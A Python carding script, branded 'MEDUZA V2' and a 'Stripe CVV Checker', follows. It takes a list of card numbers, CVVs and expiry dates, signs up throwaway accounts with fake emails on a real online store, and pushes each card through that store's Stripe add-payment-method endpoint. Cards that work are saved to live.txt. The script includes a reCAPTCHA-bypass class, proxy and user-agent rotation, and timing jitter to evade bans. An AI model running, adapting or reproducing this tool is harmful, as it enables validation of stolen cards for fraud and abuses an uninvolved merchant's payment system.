from __future__ import annotations
import os,sys,time,json,random,uuid,string,requests,secrets,re,threading
from faker import Faker
from threading import Semaphore
from datetime import datetime
from dataclasses import dataclass
from enum import Enum, auto
from concurrent.futures import ThreadPoolExecutor, as_completed
from urllib.parse import parse_qsl, urlencode
from pathlib import Path
from typing import Optional
from requests.exceptions import (
    ProxyError,
    SSLError,
    ConnectionError,
    Timeout,
    HTTPError,
    TooManyRedirects,
    ChunkedEncodingError,
    ContentDecodingError,
    InvalidURL,
    InvalidSchema,
    RequestException
)
import socket
import urllib3
urllib3.disable_warnings()
from http.cookiejar import LWPCookieJar
from typing import Any, Dict, Optional, Tuple, List
import traceback
from pathlib import Path
from colorama import Fore, Style, init
init(autoreset=True)

def gstr(src, a, b):
    try:
        return src.split(a, 1)[1].split(b, 1)[0]
    except Exception:
        return ""



RESET = "\033[0m"
WHITE = "\033[97m"
GRAY = "\033[90m"
RED = "\033[91m"
GREEN = "\033[92m"
YELLOW = "\033[93m"


def safe_exit(code=1):
    try:
        os._exit(code)
    except Exception:
        sys.exit(code)


def clear():
    try:
        if os.name == "nt":
            os.system("cls")
        else:
            os.system("clear")
    except Exception:
        pass


class FlowResult(Enum):
    LIVE = auto()
    LIVE_CCN = auto()
    DECLINED = auto()
    THREE_DS = auto()
    UNKNOWN = auto()

class ResponseNormalizer:
    @staticmethod
    def normalize(resp: Any) -> Dict[str, Any]:
        if not isinstance(resp, dict):
            return {}

        data = resp.get("data")
        if isinstance(data, dict):
            return data

        return resp


class StripeFlow:
    def handle(self, data, cc_num, mm, yy, cvv, filename: str = "live.txt") -> bool:
        global LIVE, DECLINED, ERROR, TOTAL

        intent = self._extract_intent(data)
        status = self._safe_get(intent, "status")
        next_action = intent.get("next_action") if isinstance(intent, dict) else None

        error = self._extract_error(data, intent)
        msg, reason = self._build_reason(error)

        card = f"{cc_num}|{mm}|{yy}|{cvv}"

        # ===== SUCCESS (CLEAN) =====
        if status == "succeeded":
            print(f"{card} --> {Fore.GREEN}LIVE{Style.RESET_ALL} | Approved.")
            with open(filename, "a", encoding="utf-8") as f:
                f.write(card + "|SUCCEEDED\n")
            return True

        # ===== SUCCESS (FALLBACK) =====
        if status == "succeeded" and not next_action:
            print(f"{card} --> {Fore.GREEN}LIVE 200{Style.RESET_ALL} | Approved.")
            with open(filename, "a", encoding="utf-8") as f:
                f.write(card + "|SUCCEEDED\n")
            return True

        if msg and "you cannot add a new payment method so soon" in msg.lower():
            print(f"{card} --> {Fore.YELLOW}RATE_LIMIT{Style.RESET_ALL} | {msg}")
            return False

        # ===== REQUIRES PAYMENT METHOD =====
        if status == "requires_payment_method":
            return self._handle_requires_payment_method(card, msg, reason)

        # ===== 3DS / ACTION REQUIRED =====
        if status == ("requires_action"):
            print(f"{card} --> {Fore.YELLOW}3DS{Style.RESET_ALL} | Three3ds secure")
            return False

        # ===== ERROR =====
        if error:
            self._print_declined(card, msg)
            return False

        # ===== DEFAULT DECLINED =====

        print(f"{card} --> {Fore.RED}CARD_DECLINED{Style.RESET_ALL} | {msg}")
        return False

    def _handle_requires_payment_method(
        self,
        card: str,
        msg: Optional[str],
        reason: str,
        filename: str = "live.txt"
    ) -> bool:
        global LIVE, DECLINED, ERROR, TOTAL

        if "insufficient_funds" in reason or "Your card has insufficient funds." in reason:
            print(f"{card} --> {Fore.GREEN}LIVE{Style.RESET_ALL}")
            with open(filename, "a", encoding="utf-8") as f:
                f.write(card + "|INSUFFICIENT_FUNDS\n")
            return True

        if "incorrect_cvc" in reason or "Your card's security code is incorrect." in reason:
            print(f"{card} --> {Fore.GREEN}LIVE CCN{Style.RESET_ALL} | incorrect_cvc")
            with open(filename, "a", encoding="utf-8") as f:
                f.write(card + "|CVV MISMATH\n")
            return True

        if any(k in reason for k in ("authentication", "three_d", "3d")):
            print(f"{card} --> {Fore.YELLOW}3DS{Style.RESET_ALL} | Three3ds secure")
            return False


        self._print_declined(card, msg)
        return False

    @staticmethod
    def _print_declined(card: str, msg: Optional[str]) -> None:
        global LIVE, DECLINED, ERROR, TOTAL
        if msg:

            print(f"{card} --> {Fore.RED}CARD_DECLINED{Style.RESET_ALL} | {msg}")
        else:
            print(f"{card} --> {Fore.RED}CARD_DECLINED{Style.RESET_ALL}")

    @staticmethod
    def _extract_intent(data: Any) -> Dict[str, Any]:
        if not isinstance(data, dict):
            return {}

        error = data.get("error")
        if isinstance(error, dict):
            for key in ("payment_intent", "setup_intent"):
                if isinstance(error.get(key), dict):
                    return error[key]

        for key in ("payment_intent", "setup_intent", "data"):
            if isinstance(data.get(key), dict):
                return data[key]

        return data

    @staticmethod
    def _extract_error(
        data: Any,
        intent: Dict[str, Any],
    ) -> Optional[Dict[str, Any]]:

        if isinstance(data, dict):
            inner = data.get("data")
            if isinstance(inner, dict):
                err = inner.get("error")
                if isinstance(err, dict):
                    return err

        if isinstance(data, dict):
            err = data.get("error")
            if isinstance(err, dict):
                return err

        if isinstance(intent, dict):
            for key in ("last_payment_error", "last_setup_error"):
                err = intent.get(key)
                if isinstance(err, dict):
                    return err

        return None

    @staticmethod
    def _build_reason(
        err: Optional[Dict[str, Any]]
    ) -> Tuple[Optional[str], str]:

        if not isinstance(err, dict):
            return None, ""

        msg = err.get("message") if isinstance(err.get("message"), str) else None

        parts = []
        for key in ("decline_code", "code", "type"):
            val = err.get(key)
            if isinstance(val, str):
                parts.append(val.lower())

        return msg, " ".join(parts)

    @staticmethod
    def _safe_get(obj: Any, key: str) -> Optional[str]:
        if isinstance(obj, dict):
            val = obj.get(key)
            if isinstance(val, str):
                return val
        return None

    @staticmethod
    def _save_success(card: str, filename: str = "live.txt") -> None:
        try:
            with open(filename, "a", encoding="utf-8") as f:
                f.write(card + "\n")
        except Exception:
            pass


# ---------- CONTOH PENGGUNAAN FLOW STRIPE ------------

# url = f"https://example.com/check?card={cc}|{mm}|{yy}|{cvv}"
# r = requests.get(url, timeout=65, timeout=30, verify=False)

# try:
#     raw = r.json()
# except Exception:
#     raw = {}

# data = ResponseNormalizer.normalize(raw)

# result = flow.handle(data, cc, mm, yy, cvv)

# ---------- CONTOH PENGGUNAAN FLOW STRIPE ------------



class RecaptchaSolver:
    _BASE = "https://www.google.com/recaptcha"
    _HEADERS = {
        "Content-Type": "application/x-www-form-urlencoded",
        "User-Agent": (
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
            "AppleWebKit/537.36 (KHTML, like Gecko) "
            "Chrome/120.0.0.0 Safari/537.36"
        )
    }

    _RE_API = re.compile(r"(api2|enterprise)/anchor\?(.*)")
    _RE_C = re.compile(r'value="([^"]+)"')
    _RE_TOKEN = re.compile(r'"rresp","([^"]+)"')

    def __init__(self, proxies: Optional[List[str]] = None, cookie_file: str = "cookies.txt") -> None:
        self.proxies = proxies or []
        self.cookie_file = cookie_file
        self.cookie_jar = LWPCookieJar(cookie_file)
        self.session = requests.Session()
        self.session.headers.update(self._HEADERS)
        try:
            self.cookie_jar.load(ignore_discard=True)
            for c in self.cookie_jar:
                self.session.cookies.set_cookie(c)
        except FileNotFoundError:
            pass

    def solve(self, anchor_url: str) -> str:
        api, params = self._parse(anchor_url)
        proxy = self._choose_proxy()
        anchor_html = self._get(f"{self._BASE}/{api}/anchor", params=params, proxy=proxy)
        c_value = self._extract(self._RE_C, anchor_html, "c_value")
        self._last_params = params
        self._last_c = c_value
        payload = self._payload(params, c_value)
        reload_html = self._post(f"{self._BASE}/{api}/reload", params={"k": params["k"]}, data=payload, proxy=proxy)
        for c in self.session.cookies:
            self.cookie_jar.set_cookie(c)
        self.cookie_jar.save(ignore_discard=True)
        return self._extract(self._RE_TOKEN, reload_html, "token")

    def solve_any(self, url: str) -> str:
        if "/anchor" in url:
            return self.solve(url)
        elif "/reload" in url:
            params = dict(parse_qsl(url.split("?")[1]))
            k = params.get("k")
            if not k:
                raise ValueError("Missing site key in reload URL")
            if not hasattr(self, "_last_params") or not hasattr(self, "_last_c"):
                raise ValueError("Reload URL provided without prior anchor context.")
            proxy = self._choose_proxy()
            payload = self._payload(self._last_params, self._last_c)
            reload_html = self._post(url, params={"k": k}, data=payload, proxy=proxy)
            return self._extract(self._RE_TOKEN, reload_html, "token")
        else:
            raise ValueError("Unsupported URL type — must contain /anchor or /reload")

    def _parse(self, url: str) -> Tuple[str, dict]:
        m = self._RE_API.search(url)
        if not m:
            raise ValueError("Invalid anchor URL")
        api = m.group(1)
        params = dict(parse_qsl(m.group(2)))
        for k in ("k", "v", "co"):
            if k not in params:
                raise ValueError(f"Missing param: {k}")
        return api, params

    @staticmethod
    def _payload(p: dict, c: str) -> str:
        return urlencode({
            "v": p["v"],
            "reason": "q",
            "c": c,
            "k": p["k"],
            "co": p["co"],
        })

    @staticmethod
    def _extract(regex: re.Pattern, text: str, name: str) -> str:
        m = regex.search(text)
        if not m:
            raise ValueError(f"Failed to extract {name}")
        return m.group(1)

    def _choose_proxy(self) -> Optional[dict]:
        if not self.proxies:
            return None
        proxy_url = random.choice(self.proxies)
        return {"http": proxy_url, "https": proxy_url}

    def _get(self, url: str, params: dict, proxy: Optional[dict], retry: int = 3) -> str:
        last_exception: Optional[Exception] = None
        for _ in range(retry):
            try:
                r = self.session.get(url, params=params, proxies=proxy, timeout=10)
                r.raise_for_status()
                return r.text
            except Exception as e:
                last_exception = e
                time.sleep(0.5 + random.random())
        raise RuntimeError(f"GET failed after {retry} attempts: {last_exception}")

    def _post(self, url: str, params: dict, data: str, proxy: Optional[dict], retry: int = 3) -> str:
        last_exception: Optional[Exception] = None
        for _ in range(retry):
            try:
                r = self.session.post(url, params=params, data=data, proxies=proxy, timeout=10)
                r.raise_for_status()
                return r.text
            except Exception as e:
                last_exception = e
                time.sleep(0.5 + random.random())
        raise RuntimeError(f"POST failed after {retry} attempts: {last_exception}")

alphabet = "abcdefghijklmnopqrstuvwxyz0123456789"
symbols = "._-"

def parse(line):
    try:
        cc, mm, yy, cvv = line.split("|")
    except ValueError:
        return

    if not cc.isdigit():
        return

    if not cvv.isdigit():
        return

    cvv = cvv[:4]

    if yy.isdigit():
        if len(yy) == 4:
            yy = yy[-2:]
        elif len(yy) != 2:
            return
    else:
        return

    if not mm.isdigit():
        return

    mm = mm.zfill(2)

    fake = Faker("en_US")
    zipcode = (
        fake.postal_code() if hasattr(fake, "postal_code")
        else fake.zipcode() if hasattr(fake, "zipcode")
        else fake.postcode() if hasattr(fake, "postcode")
        else "00000"
    )
    flow = StripeFlow()
    uuid1,uuid2,uuid3,uuid4=[str(uuid.uuid4()) for _ in range(4)]
    target_len = random.randint(6, 26)
    username = random.choice(alphabet)
    while len(username) < target_len:
        last = username[-1]
        if last in symbols:
            username += random.choice(alphabet)
        else:
            username += random.choice(alphabet + symbols)

    username = username.strip("._-")[:target_len]

    faker_domains = [
        Faker().free_email_domain(),
        Faker().domain_name()
    ]
    extra_domains = [
       'gmail.com','yahoo.com','outlook.com','hotmail.com','icloud.com','proton.me','protonmail.com','live.com','msn.com','yahoo.co.id','yahoo.co.uk','yahoo.co.jp','ymail.com','rocketmail.com','live.uk','live.co.uk','live.ca','outlook.co.uk','outlook.jp','tutanota.com','tutanota.de','mailbox.org','zoho.com','zohomail.com','fastmail.com','pm.me','yandex.com','yandex.ru','mail.ru','gmx.com','gmx.de','web.de','seznam.cz','laposte.net','orange.fr','edumail.vn','student.mail','alumni.email','icousd.com','ymail.cc','byom.de','momoi.re','mailgun.co','inboxkitten.com','maildrop.cc', 'web.de', 'byom.my.id', 'aquamail.com', 'zoho.com', 'zohomail.com', 'etzy.de', 'anonmail.cc', 'mega.com'
    ]
    email_domain = random.choice(faker_domains + extra_domains)
    email2 = f"{username}@{email_domain}"
    username = f"{Faker().user_name().lower()}_{secrets.token_hex(4)}"
    today = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    rotateUA = Faker().user_agent()
    email = f"{Faker().user_name().lower()}_{secrets.token_hex(4)}@{random.choice(['gmail.com','yahoo.com','outlook.com','hotmail.com','icloud.com','proton.me','protonmail.com','live.com','msn.com','yahoo.co.id','yahoo.co.uk','yahoo.co.jp','ymail.com','rocketmail.com','live.uk','live.co.uk','live.ca','outlook.co.uk','outlook.jp','tutanota.com','tutanota.de','mailbox.org','zoho.com','zohomail.com','fastmail.com','pm.me','yandex.com','yandex.ru','mail.ru','gmx.com','gmx.de','web.de','seznam.cz','laposte.net','orange.fr','edumail.vn','student.mail','alumni.email','icousd.com','ymail.cc','byom.de','momoi.re','mailgun.co','inboxkitten.com','maildrop.cc', 'web.de', 'byom.my.id'])}"
    se = requests.Session()
    solver = RecaptchaSolver()
    try:

        headers = {
            'Host': 'store.sfwa.org',
            'Cache-Control': 'max-age=0',
            'User-Agent': rotateUA,
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.7',
            'Connection': 'keep-alive',
        }

        r = se.get('https://store.sfwa.org/my-account-5/', headers=headers, timeout=30, verify=False)
        regN = gstr(r.text.strip(), '"woocommerce-register-nonce" value="', '"')

        headers = {
            'Host': 'store.sfwa.org',
            'Cache-Control': 'max-age=0',
            'Origin': 'https://store.sfwa.org',
            'Content-Type': 'application/x-www-form-urlencoded',
            'User-Agent': rotateUA,
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.7',
            'Referer': 'https://store.sfwa.org/my-account-5/',
            'Priority': 'u=0, i',
        }

        data = {
            'email': email2,
            'woocommerce-register-nonce': regN,
            '_wp_http_referer': '/my-account-5/',
            'register': 'Register',
        }

        r = se.post('https://store.sfwa.org/my-account-5/', headers=headers, data=data, timeout=30, verify=False)

        headers = {
            'Host': 'store.sfwa.org',
            'User-Agent': rotateUA,
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.7',
            'Referer': 'https://store.sfwa.org/my-account-5/',
            'Priority': 'u=0, i',
        }

        r = se.get('https://store.sfwa.org/my-account-2/payment-methods/', headers=headers, timeout=30, verify=False)


        headers = {
            'Host': 'store.sfwa.org',
            'User-Agent': rotateUA,
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.7',
            'Referer': 'https://store.sfwa.org/my-account-2/payment-methods/',
            'Priority': 'u=0, i',
        }

        r = se.get('https://store.sfwa.org/my-account-2/add-payment-method/', headers=headers, timeout=30, verify=False)
        dxd = r.text.strip()
        setupNonce = gstr(dxd, 'createAndConfirmSetupIntentNonce":"', '"')
        pkl = gstr(dxd, '"key":"', '"') or \
        "pk_live_51IV2OrFnMYXxYsagxPrahDoBBPOz8GFfXMhiMjYg1yMenkBUUTLVygcUDin9RS4jQxc33L3Lc754iBoIc0p5ifqv00FfLWbN1r"

        headers = {
            'Host': 'api.stripe.com',
            'User-Agent': rotateUA,
            'Accept': 'application/json',
            'Content-Type': 'application/x-www-form-urlencoded',
            'Accept-Language': 'en-US,en;q=0.7',
            'Origin': 'https://js.stripe.com',
            'Referer': 'https://js.stripe.com/',
            'Priority': 'u=1, i',
            'Connection': 'keep-alive',
        }

        r = se.get(
            f'https://api.stripe.com/v1/elements/sessions?deferred_intent[mode]=setup&deferred_intent[currency]=usd&deferred_intent[payment_method_types][0]=card&deferred_intent[payment_method_types][1]=link&deferred_intent[setup_future_usage]=off_session&currency=usd&key={pkl}&_stripe_version=2024-06-20&elements_init_source=stripe.elements&referrer_host=store.sfwa.org&stripe_js_id={uuid1}&locale=en&type=deferred_intent',
            headers=headers,
            timeout=30,
            verify=False
        )


        headers = {
            'Host': 'api.stripe.com',
            'User-Agent': rotateUA,
            'Accept': 'application/json',
            'Content-Type': 'application/x-www-form-urlencoded',
            'Sec-Ch-Ua-Mobile': '?0',
            'Sec-Gpc': '1',
            'Accept-Language': 'en-US,en;q=0.7',
            'Origin': 'https://js.stripe.com',
            'Referer': 'https://js.stripe.com/',
            'Priority': 'u=1, i',
        }


        data = {
            "type": "card",
            "card[number]": cc,
            "card[cvc]": cvv,
            "card[exp_year]": yy,
            "card[exp_month]": mm,
            "allow_redisplay": "unspecified",
            "billing_details[address][postal_code]": zipcode,
            "billing_details[address][country]": "US",
            "pasted_fields": "number,cvc",
            "payment_user_agent": "stripe.js/0128c9fdb9; stripe-js-v3/0128c9fdb9; payment-element; deferred-intent",
            "referrer": "https://store.sfwa.org",
            "time_on_page": "43012",
            "client_attribution_metadata[client_session_id]": "6b9ba3dd-a604-4356-bb31-b73b21f1a6f5",
            "client_attribution_metadata[merchant_integration_source]": "elements",
            "client_attribution_metadata[merchant_integration_subtype]": "payment-element",
            "client_attribution_metadata[merchant_integration_version]": "2021",
            "client_attribution_metadata[payment_intent_creation_flow]": "deferred",
            "client_attribution_metadata[payment_method_selection_flow]": "merchant_specified",
            "client_attribution_metadata[elements_session_config_id]": "0fe8e78f-c5e7-4319-a0c3-e62f2591e150",
            "client_attribution_metadata[merchant_integration_additional_elements][0]": "payment",
            "guid": uuid3,
            "muid": uuid4,
            "sid": uuid2,
            "key": pkl,
            "_stripe_version": "2024-06-20"
        }

        r = se.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data, timeout=30, verify=False)
        dxds = gstr(r.text.strip(), 'id": "', '"')
        if not dxds:
            mseg = gstr(r.text.strip(), '"message": "', '"')
            print(f"{cc}|{mm}|{yy}|{cvv} --> {Fore.RED}CARD_DECLINED{Style.RESET_ALL} | {mseg}")
            return False

        headers = {
            'Accept': '*/*',
            'Accept-Language': 'en-US,en;q=0.9',
            'Cache-Control': 'no-cache',
            'Connection': 'keep-alive',
            'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'Origin': 'https://store.sfwa.org',
            'Pragma': 'no-cache',
            'Referer': 'https://store.sfwa.org/my-account-2/add-payment-method/',
            'Sec-Fetch-Dest': 'empty',
            'Sec-Fetch-Mode': 'cors',
            'Sec-Fetch-Site': 'same-origin',
            'User-Agent': rotateUA,
            'X-Requested-With': 'XMLHttpRequest',
        }

        data = {
            'action': 'wc_stripe_create_and_confirm_setup_intent',
            'wc-stripe-payment-method': dxds,
            'wc-stripe-payment-type': 'card',
            '_ajax_nonce': setupNonce,
        }

        r = se.post(
            "https://store.sfwa.org/wp-admin/admin-ajax.php",
            headers=headers,
            data=data,
            timeout=50,
            verify=False,
            allow_redirects=False
        )
        try:
            raw = r.json()
        except Exception:
            raw = r.text.strip()

        data = ResponseNormalizer.normalize(raw)

        result = flow.handle(
            data,
            cc,
            mm,
            yy,
            cvv,
            filename="live.txt"
        )

        return result

        try:
            data = r.json()
        except Exception:
            data = {}

        intent = data.get("error", {}).get("setup_intent") or data or {}
        status = intent.get("status")
        next_action = intent.get("next_action")

        if status == "requires_payment_method":
            err = data.get("error", {})

            code = (err.get("code") or "").lower()
            decline = (err.get("decline_code") or "").lower()
            msg = (err.get("message") or "declined").lower()

            if "insufficient_funds" in code or "insufficient_funds" in decline or "your card has insufficient funds" in msg:
               print(f"{cc}|{mm}|{yy}|{cvv} --> {Fore.GREEN}LIVE{Style.RESET_ALL} | Insufficient_funds")
               return True

            if "incorrect_cvc" in code or "incorrect_cvc" in decline or "Your card's security code is incorrect" in msg:
                print(f"{cc}|{mm}|{yy}|{cvv} --> {Fore.GREEN}LIVE CCN{Style.RESET_ALL} | {err.get('message','declined')}")
                return True

            print(f"{cc}|{mm}|{yy}|{cvv} --> {Fore.RED}CARD_DECLINED{Style.RESET_ALL} | {err.get('message','declined')}")
            return False


        elif status =="succeeded" and next_action is None:
            print(f"{cc}|{mm}|{yy}|{cvv} --> {Fore.GREEN}APPROVED {r.status_code}{Style.RESET_ALL} | Succeeded")
            return True

        elif status =="requires_action":
            print(f"{cc}|{mm}|{yy}|{cvv} --> {Fore.YELLOW}THREE3DS FAIL{Style.RESET_ALL} | Solve three3ds failed")
            return None

        print(txt)


    except ProxyError:
        print(f"{cc}|{mm}|{yy}|{cvv} --> {Fore.RED}ERROR{Style.RESET_ALL} | Proxy unavailable. Please replace or retry.")
        return None

    except SSLError:
        print(f"{cc}|{mm}|{yy}|{cvv} --> {Fore.RED}ERROR{Style.RESET_ALL} | SSL handshake failed. Check HTTPS or proxy.")
        return None

    except (ConnectionError, Timeout, socket.timeout):
        print(f"{cc}|{mm}|{yy}|{cvv} --> {Fore.RED}ERROR{Style.RESET_ALL} | Network timeout. Connection may be slow.")
        return None

    except HTTPError as e:
        print(
            f"{cc}|{mm}|{yy}|{cvv} --> {Fore.RED}ERROR{Style.RESET_ALL} | HTTP {e.response.status_code}. Server rejected the request."
        )
        return None

    except TooManyRedirects:
        print(f"{cc}|{mm}|{yy}|{cvv} --> {Fore.RED}ERROR{Style.RESET_ALL} | Redirect loop detected.")
        return None

    except (ChunkedEncodingError, ContentDecodingError):
        print(f"{cc}|{mm}|{yy}|{cvv} --> {Fore.RED}ERROR{Style.RESET_ALL} | Corrupted server response.")
        return None

    except (InvalidURL, InvalidSchema):
        print(f"{cc}|{mm}|{yy}|{cvv} --> {Fore.RED}ERROR{Style.RESET_ALL} | Invalid request URL.")
        return None

    except RequestException as e:
        print(f"{cc}|{mm}|{yy}|{cvv} --> {Fore.RED}ERROR{Style.RESET_ALL} | Request failed: {e}")
        return None

    except Exception as e:
        print(f"{cc}|{mm}|{yy}|{cvv} --> {Fore.RED}FATAL{Style.RESET_ALL} | Unexpected error: {e}")
        return None

    finally:
        se.close()


ascii_banner = rf"""
   {Fore.LIGHTCYAN_EX}███{Fore.WHITE}╗   {Fore.LIGHTCYAN_EX}███{Fore.WHITE}╗{Fore.LIGHTCYAN_EX}███████{Fore.WHITE}╗{Fore.LIGHTCYAN_EX}██████{Fore.WHITE}╗ {Fore.LIGHTCYAN_EX}██{Fore.WHITE}╗   {Fore.LIGHTCYAN_EX}██{Fore.WHITE}╗{Fore.LIGHTCYAN_EX}{Fore.LIGHTCYAN_EX}███████{Fore.WHITE}╗ {Fore.LIGHTCYAN_EX}█████{Fore.WHITE}╗
   {Fore.LIGHTCYAN_EX}████{Fore.WHITE}╗ {Fore.LIGHTCYAN_EX}████{Fore.WHITE}║{Fore.LIGHTCYAN_EX}██{Fore.WHITE}╔════╝{Fore.LIGHTCYAN_EX}██{Fore.WHITE}╔══{Fore.LIGHTCYAN_EX}██{Fore.WHITE}╗{Fore.LIGHTCYAN_EX}██{Fore.WHITE}║   {Fore.LIGHTCYAN_EX}██{Fore.WHITE}║╚══{Fore.LIGHTCYAN_EX}███{Fore.WHITE}╔╝{Fore.LIGHTCYAN_EX}██{Fore.WHITE}╔══{Fore.LIGHTCYAN_EX}██{Fore.WHITE}╗
   {Fore.LIGHTCYAN_EX}██{Fore.WHITE}╔{Fore.LIGHTCYAN_EX}████{Fore.WHITE}╔{Fore.LIGHTCYAN_EX}██{Fore.WHITE}║{Fore.LIGHTCYAN_EX}█████{Fore.WHITE}╗  {Fore.LIGHTCYAN_EX}██{Fore.WHITE}║  {Fore.LIGHTCYAN_EX}██{Fore.WHITE}║{Fore.LIGHTCYAN_EX}██{Fore.WHITE}║   {Fore.LIGHTCYAN_EX}██{Fore.WHITE}║  {Fore.LIGHTCYAN_EX}███{Fore.WHITE}╔{Fore.WHITE}╝ {Fore.LIGHTCYAN_EX}███████{Fore.WHITE}║
   {Fore.LIGHTCYAN_EX}██{Fore.WHITE}║╚{Fore.LIGHTCYAN_EX}██{Fore.WHITE}╔╝{Fore.LIGHTCYAN_EX}██{Fore.WHITE}║{Fore.LIGHTCYAN_EX}██{Fore.WHITE}╔══╝  {Fore.LIGHTCYAN_EX}██{Fore.WHITE}║{Fore.LIGHTCYAN_EX}  ██{Fore.WHITE}║{Fore.LIGHTCYAN_EX}██{Fore.WHITE}║   {Fore.LIGHTCYAN_EX}██{Fore.WHITE}║ {Fore.LIGHTCYAN_EX}███{Fore.WHITE}╔╝  {Fore.LIGHTCYAN_EX}██{Fore.WHITE}╔══{Fore.LIGHTCYAN_EX}██{Fore.WHITE}║{Fore.LIGHTCYAN_EX}
   ██{Fore.WHITE}║{Fore.LIGHTCYAN_EX} {Fore.WHITE}╚═╝{Fore.LIGHTCYAN_EX} ██{Fore.WHITE}║{Fore.LIGHTCYAN_EX}███████{Fore.WHITE}╗{Fore.LIGHTCYAN_EX}██████{Fore.WHITE}╔╝╚{Fore.LIGHTCYAN_EX}██████{Fore.WHITE}╔╝{Fore.LIGHTCYAN_EX}███████{Fore.WHITE}╗{Fore.LIGHTCYAN_EX}██{Fore.WHITE}║  {Fore.LIGHTCYAN_EX}██{Fore.WHITE}║
   {Fore.WHITE}╚═╝     ╚═╝╚══════╝╚═════╝  ╚═════╝ ╚══════╝╚═╝  ╚═╝
"""


def set_terminal_title(title):
    import os, sys
    if os.name == "nt":
        os.system(f"title {title}")
    else:
        sys.stdout.write(f"\x1b]0;{title}\x07")


def prompt_restart():
    try:
        choice = input(
            Fore.WHITE
            + f"\n\n[ {Fore.LIGHTRED_EX}?{Fore.WHITE} ] "
            + f"{Fore.LIGHTCYAN_EX}Run the tool again? [Y/n]: "
            + Style.RESET_ALL
        ).strip().lower()
        return choice in ("", "y", "yes")
    except (KeyboardInterrupt, EOFError):
        return False


def main():

    import shutil, textwrap

    set_terminal_title("MEDUZA V2 TOOLS  ")

    os.system("cls" if os.name == "nt" else "clear")

    DIVIDER = Fore.LIGHTWHITE_EX + "-" * 65 + Style.RESET_ALL

    set_terminal_title("MEDUZA V2 TOOLS  ")
    print(Fore.WHITE + ascii_banner + Style.RESET_ALL)

    term_width = shutil.get_terminal_size((80, 20)).columns

    header_text = (
        Fore.LIGHTRED_EX
        + "Stripe CVV Checker "
        + Fore.WHITE + "│ "
        + Fore.LIGHTRED_EX + "Tg: @xqndrs66 - @xqndrs "
        + Fore.WHITE + "│ "
        + Fore.LIGHTRED_EX + "github.com/KianSantang777"
        + Style.RESET_ALL
    )

    print(textwrap.fill(header_text, width=term_width))
    print(DIVIDER)

    print(DIVIDER)

    print(F"{Fore.CYAN}[+]{Fore.WHITE} Drag/Paste your CC combo file (.txt, UTF-8).{Style.RESET_ALL}")
    print(DIVIDER)
    try:
        raw_path = input(f"{Fore.LIGHTYELLOW_EX}▹ Path combolist card : " + Style.RESET_ALL)
        file_path = raw_path.strip().strip('"').strip('"')

    except KeyboardInterrupt:
        print()
        print(DIVIDER)
        print(
            Fore.WHITE
            + f"[ {Fore.LIGHTRED_EX}CTRL + C DETECTED{Fore.WHITE} ] "
            + "Interrupted. Exiting Kiansantang tools.\n"
            + Style.RESET_ALL
        )
        sys.exit(2)

    if not file_path.lower().endswith(".txt"):
        print(DIVIDER)
        print(
            Fore.WHITE
            + f"[ {Fore.LIGHTRED_EX}INVALID FILE{Fore.WHITE} ] "
            + "Only .txt files encoded in UTF-8 are supported.\n"
            + Style.RESET_ALL
        )
        exit(2)
        return

    try:
        with open(file_path, "r", encoding="utf-8") as f:
            cards = [line.strip() for line in f if line.strip()]

    except UnicodeDecodeError:
        print(DIVIDER)
        print(
            Fore.WHITE
            + f"[ {Fore.LIGHTRED_EX}ENCODING ERROR{Fore.WHITE} ] "
            + "The file must be encoded in UTF-8.\n"
            + Style.RESET_ALL
        )
        exit(2)
        return

    except IsADirectoryError:
        print(DIVIDER)
        print(
            Fore.WHITE
            + f"[ {Fore.LIGHTRED_EX}INVALID PATH{Fore.WHITE} ] "
            + "The provided path is a directory, not a file.\n"
            + Style.RESET_ALL
        )
        exit(2)
        return

    except PermissionError:
        print(DIVIDER)
        print(
            Fore.WHITE
            + f"[ {Fore.LIGHTRED_EX}PERMISSION DENIED{Fore.WHITE} ] "
            + "You do not have permission to read this file.\n"
            + Style.RESET_ALL
        )
        exit(2)
        return

    except FileNotFoundError:
        print(DIVIDER)
        print(
            Fore.WHITE
            + f"[ {Fore.LIGHTRED_EX}FILE NOT FOUND{Fore.WHITE} ] "
            + "The specified file path does not exist.\n"
            + Style.RESET_ALL
        )
        exit(2)
        return

    except OSError:
        print(DIVIDER)
        print(
            Fore.WHITE
            + f"[ {Fore.LIGHTRED_EX}SYSTEM ERROR{Fore.WHITE} ] "
            + "An operating system error occurred while accessing the file.\n"
            + Style.RESET_ALL
        )
        exit(2)
        return

    except Exception as e:
        print(DIVIDER)
        print(
            Fore.WHITE
            + f"[ {Fore.LIGHTRED_EX}UNEXPECTED ERROR{Fore.WHITE} ] "
            + str(e)
            + "\n" + Style.RESET_ALL
        )
        exit(2)
        return

    print(DIVIDER)
    print(f"{Fore.CYAN}[+]{Fore.WHITE} Higher threads are faster but increase the risk of IP bans and errors.{Style.RESET_ALL}")
    print(DIVIDER)

    raw_threads = input(
        Fore.YELLOW + "▹ Threads [1–10] (default: 3) : " + Style.RESET_ALL
    ).strip()

    try:
        threads = int(raw_threads) if raw_threads else 3
        if not 1 <= threads <= 10:
            raise ValueError
    except ValueError:
        print(DIVIDER)
        print(
            Fore.WHITE
            + f"[ {Fore.LIGHTRED_EX}INVALID THREADS{Fore.WHITE} ] "
            + "Threads must be between 1 and 10.\n"
            + Style.RESET_ALL
        )
        exit(2)
        return

    print(DIVIDER)
    live_path = Path("live.txt").resolve()
    print(Fore.WHITE + f"{Fore.CYAN}[+]{Fore.WHITE} Card live will be saved to: {Fore.YELLOW}{live_path}" + Style.RESET_ALL)
    print(DIVIDER)

    RATE_LIMIT = Semaphore(threads)

    def worker(card):
        with RATE_LIMIT:
            time.sleep(random.uniform(1.3, 5.8))
            return parse(card)

    try:
        with ThreadPoolExecutor(max_workers=threads) as executor:
            futures = []

            for card in cards:
                futures.append(executor.submit(worker, card))
                time.sleep(random.uniform(0.2, 1.3))

